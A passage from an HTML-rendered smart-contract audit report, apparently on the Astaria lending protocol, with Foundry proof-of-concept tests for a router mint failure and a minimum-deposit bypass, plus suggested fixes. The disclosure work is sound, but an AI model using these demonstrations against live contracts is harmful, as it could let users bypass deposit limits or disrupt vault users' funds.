class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">bob</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">2</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">deal</span><span class=\"mtk1\">(</span><span class=\"mtk12\">bob</span><span class=\"mtk1\">, </span><span class=\"mtk12\">amountIn</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">TestNFT</span><span class=\"mtk1\"> </span><span class=\"mtk12\">nft</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">TestNFT</span><span class=\"mtk1\">(</span><span class=\"mtk7\">2</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">_mintNoDepositApproveRouter</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">nft</span><span class=\"mtk1\">), </span><span class=\"mtk7\">5</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tokenContract</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">nft</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">uint256</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">publicVault</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_createPublicVault</span><span class=\"mtk1\">({</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">strategist:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">strategistOne</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">delegate:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">strategistTwo</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">epochLength:</span><span class=\"mtk1\"> </span><span class=\"mtk7\">14</span><span class=\"mtk1\"> </span><span class=\"mtk12\">days</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    });</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// after alice deposits 50 ether WETH in publicVault, publicVault&#39;s share price becomes 1</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">_lendToVault</span><span class=\"mtk1\">(</span><span class=\"mtk11\">Lender</span><span class=\"mtk1\">({</span><span class=\"mtk12\">addr:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">alice</span><span class=\"mtk1\">, </span><span class=\"mtk12\">amountToLend:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amountIn</span><span class=\"mtk1\">}), </span><span class=\"mtk12\">publicVault</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// the borrower borrows 10 ether WETH from publicVault</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    (, </span><span class=\"mtk12\">ILienToken</span><span class=\"mtk1\">.</span><span class=\"mtk12\">Stack</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">stack1</span><span class=\"mtk1\">) = </span><span class=\"mtk11\">_commitToLien</span><span class=\"mtk1\">({</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">vault:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">publicVault</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">strategist:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">strategistOne</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">strategistPK:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">strategistOnePK</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">tokenContract:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tokenContract</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">tokenId:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">lienDetails:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">standardLienDetails</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">amount:</span><span class=\"mtk1\"> </span><span class=\"mtk7\">10</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">isFirstLien:</span><span class=\"mtk1\"> </span><span class=\"mtk4\">true</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    });</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">collateralId</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">tokenContract</span><span class=\"mtk1\">.</span><span class=\"mtk11\">computeId</span><span class=\"mtk1\">(</span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// the borrower repays for the lien after 9 days, and publicVault&#39;s share price becomes bigger than 1</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">warp</span><span class=\"mtk1\">(</span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\"> + </span><span class=\"mtk7\">9</span><span class=\"mtk1\"> </span><span class=\"mtk12\">days</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">_repay</span><span class=\"mtk1\">(</span><span class=\"mtk12\">stack1</span><span class=\"mtk1\">, </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk7\">100</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">, </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">startPrank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">bob</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// bob owns 50 ether WETH</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">WETH9</span><span class=\"mtk1\">.</span><span class=\"mtk12\">deposit</span><span class=\"mtk1\">{value: </span><span class=\"mtk12\">amountIn</span><span class=\"mtk1\">}();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">WETH9</span><span class=\"mtk1\">.</span><span class=\"mtk11\">transfer</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">ASTARIA_ROUTER</span><span class=\"mtk1\">), </span><span class=\"mtk12\">amountIn</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// bob wants to mint 1 ether shares from publicVault using the router but fails</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">expectRevert</span><span class=\"mtk1\">(</span><span class=\"mtk11\">bytes</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;TRANSFER_FROM_FAILED&quot;</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">ASTARIA_ROUTER</span><span class=\"mtk1\">.</span><span class=\"mtk11\">mint</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk11\">IERC4626</span><span class=\"mtk1\">(</span><span class=\"mtk12\">publicVault</span><span class=\"mtk1\">),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">bob</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk7\">1</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk11\">type</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">).</span><span class=\"mtk12\">max</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">stopPrank</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  }</span></span></span></code></pre>\n<h3 id=\"tools-used-4\" style=\"position:relative;\"><a href=\"#tools-used-4\" aria-label=\"tools used 4 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>VSCode</p>\n<h3 id=\"recommended-mitigation-steps-22\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-22\" aria-label=\"recommended mitigation steps 22 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>In the <code>ERC4626RouterBase.mint</code> function, the public vault’s <code>previewMint</code> function can be used to get an <code>assetAmount</code> for the <code>shares</code> input.<br>\n<a href=\"https://github.com/AstariaXYZ/astaria-gpl/blob/main/src/ERC4626RouterBase.sol#L21\">https://github.com/AstariaXYZ/astaria-gpl/blob/main/src/ERC4626RouterBase.sol#L21</a> can then be updated to the following code.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"71\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">ERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">vault</span><span class=\"mtk1\">.</span><span class=\"mtk11\">asset</span><span class=\"mtk1\">()).</span><span class=\"mtk11\">safeApprove</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">vault</span><span class=\"mtk1\">), </span><span class=\"mtk12\">assetAmount</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<hr>\n<h2 id=\"m-06-for-a-public-vault-minimum-deposit-requirement-that-is-enforced-by-erc4626cloneddeposit-function-can-be-bypassed-by-erc4626clonedmint-function-or-vice-versa-when-share-price-does-not-equal-one\" style=\"position:relative;\"><a href=\"#m-06-for-a-public-vault-minimum-deposit-requirement-that-is-enforced-by-erc4626cloneddeposit-function-can-be-bypassed-by-erc4626clonedmint-function-or-vice-versa-when-share-price-does-not-equal-one\" aria-label=\"m 06 for a public vault minimum deposit requirement that is enforced by erc4626cloneddeposit function can be bypassed by erc4626clonedmint function or vice versa when share price does not equal one permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/486\">[M-06] For a public vault, minimum deposit requirement that is enforced by <code>ERC4626Cloned.deposit</code> function can be bypassed by <code>ERC4626Cloned.mint</code> function or vice versa when share price does not equal one</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/486\">rbserver</a>, also found by <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/628\">bin2chen</a>, <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/530\">0xcm</a>, <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/487\">synackrst</a>, <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/458\">0Kage</a>, <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/351\">caventa</a>, <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/180\">unforgiven</a>, and <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/21\">csanuragjain</a></em></p>\n<p>The following <code>ERC4626Cloned.deposit</code> function has <code>require(shares > minDepositAmount(), \"VALUE_TOO_SMALL\")</code> as the minimum deposit requirement, and the <code>ERC4626Cloned.mint</code> function below has <code>require(assets > minDepositAmount(), \"VALUE_TOO_SMALL\")</code> as the minimum deposit requirement. For a public vault, when the share price becomes different than 1, these functions’ minimum deposit requirements are no longer the same. For example, given <code>S</code> is the <code>shares</code> input value for the <code>ERC4626Cloned.mint</code> function and <code>A</code> equals <code>ERC4626Cloned.previewMint(S)</code>, when the share price is bigger than 1 and <code>A</code> equals <code>minDepositAmount() + 1</code>, such <code>A</code> will violate the <code>ERC4626Cloned.deposit</code> function’s minimum deposit requirement but the corresponding <code>S</code> will not violate the <code>ERC4626Cloned.mint</code> function’s minimum deposit requirement; in this case, the user can just ignore the <code>ERC4626Cloned.deposit</code> function and call <code>ERC4626Cloned.mint</code> function to become a liquidity provider. Thus, when the public vault’s share price is different than 1, the liquidity provider can call the less restrictive function out of the two so the minimum deposit requirement enforced by one of the two functions is not effective at all; this can result in unexpected deposit amounts and degraded filtering of who can participate as a liquidity provider.</p>\n<p><a href=\"https://github.com/AstariaXYZ/astaria-gpl/blob/main/src/ERC4626-Cloned.sol#L19-L36\">https://github.com/AstariaXYZ/astaria-gpl/blob/main/src/ERC4626-Cloned.sol#L19-L36</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"72\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">deposit</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">assets</span><span class=\"mtk1\">, </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">receiver</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">public</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">virtual</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">shares</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Check for rounding error since we round down in previewDeposit.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">require</span><span class=\"mtk1\">((</span><span class=\"mtk12\">shares</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">previewDeposit</span><span class=\"mtk1\">(</span><span class=\"mtk12\">assets</span><span class=\"mtk1\">)) != </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;ZERO_SHARES&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">shares</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk11\">minDepositAmount</span><span class=\"mtk1\">(), </span><span class=\"mtk8\">&quot;VALUE_TOO_SMALL&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Need to transfer before minting or ERC777s could reenter.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">ERC20</span><span class=\"mtk1\">(</span><span class=\"mtk11\">asset</span><span class=\"mtk1\">()).</span><span class=\"mtk11\">safeTransferFrom</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">), </span><span class=\"mtk12\">assets</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">_mint</span><span class=\"mtk1\">(</span><span class=\"mtk12\">receiver</span><span class=\"mtk1\">, </span><span class=\"mtk12\">shares</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  }</span></span></span></code></pre>\n<p><a href=\"https://github.com/AstariaXYZ/astaria-gpl/blob/main/src/ERC4626-Cloned.sol#L38-L52\">https://github.com/AstariaXYZ/astaria-gpl/blob/main/src/ERC4626-Cloned.sol#L38-L52</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"73\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">mint</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">shares</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">receiver</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  ) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">virtual</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">assets</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">assets</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">previewMint</span><span class=\"mtk1\">(</span><span class=\"mtk12\">shares</span><span class=\"mtk1\">); </span><span class=\"mtk3\">// No need to check for rounding error, previewMint rounds up.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">assets</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk11\">minDepositAmount</span><span class=\"mtk1\">(), </span><span class=\"mtk8\">&quot;VALUE_TOO_SMALL&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Need to transfer before minting or ERC777s could reenter.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">ERC20</span><span class=\"mtk1\">(</span><span class=\"mtk11\">asset</span><span class=\"mtk1\">()).</span><span class=\"mtk11\">safeTransferFrom</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">), </span><span class=\"mtk12\">assets</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">_mint</span><span class=\"mtk1\">(</span><span class=\"mtk12\">receiver</span><span class=\"mtk1\">, </span><span class=\"mtk12\">shares</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  }</span></span></span></code></pre>\n<h3 id=\"proof-of-concept-24\" style=\"position:relative;\"><a href=\"#proof-of-concept-24\" aria-label=\"proof of concept 24 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>Please add the following test in <code>src\\test\\AstariaTest.t.sol</code>. This test will pass to demonstrate the described scenario.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"74\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">testMinimumDepositRequirementForPublicVaultThatIsEnforcedByDepositFunctionCanBeBypassedByMintFunctionOfERC4626ClonedContractWhenSharePriceIsNotOne</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">budget</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">50</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">alice</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">bob</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">2</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">deal</span><span class=\"mtk1\">(</span><span class=\"mtk12\">bob</span><span class=\"mtk1\">, </span><span class=\"mtk12\">budget</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">TestNFT</span><span class=\"mtk1\"> </span><span class=\"mtk12\">nft</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">TestNFT</span><span class=\"mtk1\">(</span><span class=\"mtk7\">2</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span 